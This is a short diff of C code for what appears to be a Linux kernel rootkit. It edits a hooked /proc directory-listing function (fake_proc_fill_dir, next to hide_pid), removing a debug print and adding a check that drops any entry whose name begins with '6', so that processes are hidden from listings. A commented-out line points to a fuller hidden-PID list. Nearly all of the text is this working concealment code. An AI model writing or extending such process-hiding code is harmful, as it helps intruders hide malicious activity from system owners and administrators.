@@ -88,8 +88,10 @@ void hide_pid(unsigned pid) {
 */
 
 int fake_proc_fill_dir(void *a, const char *buffer, int c, loff_t d, u64 e, unsigned f) {
-	
-		printk(KERN_INFO "proc entry: %s\n", buffer);
+	//printk(KERN_INFO "proc entry: %s\n", buffer);
+	if (buffer[0] == '6') {
+		return 0;
+	}
 
 		//if(!strcmp(buffer, hidden_pids[i]))
 //			return 0; // hie all for now..
